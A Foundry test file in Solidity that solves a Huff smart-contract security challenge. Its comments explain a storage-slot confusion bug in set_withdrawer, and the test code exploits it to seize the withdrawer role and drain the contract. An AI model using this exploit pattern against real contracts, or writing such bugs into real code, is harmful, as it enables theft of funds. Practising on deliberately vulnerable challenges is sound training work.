// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract Challenge03Test is Test {
  Challenge03 target;

  /// @dev Setup the testing environment.
  function setUp() public {
    target = Challenge03(HuffDeployer.deploy("challenges/Challenge03"));

    // TODO: add funds to contract
    console.log(address(this).balance);
  }

  /// @dev Ensure that you can set and get the value.
  function testChallenge() public {
    // the bug is within set_withdrawer, which loads the slot not OWNER_SLOT
    // but CALLVALUE instead, so we can check any slot with it
    // so, we will first make ourself the last_depositor
    // and then call set_withdraw with CALLVALUE equal to LAST_DEPOSITOR_SLOT

    // deposit 1 wei
    target.deposit{value: 1}();

    // override owner
    target.set_withdrawer{value: 2}(address(this));

    // withdraw
    target.withdraw();
  }

  // TODO: check after contract

  receive() external payable {}
}

interface Challenge03 {
  function deposit() external payable;

  function withdraw() external;

  function set_withdrawer(address) external payable;
}
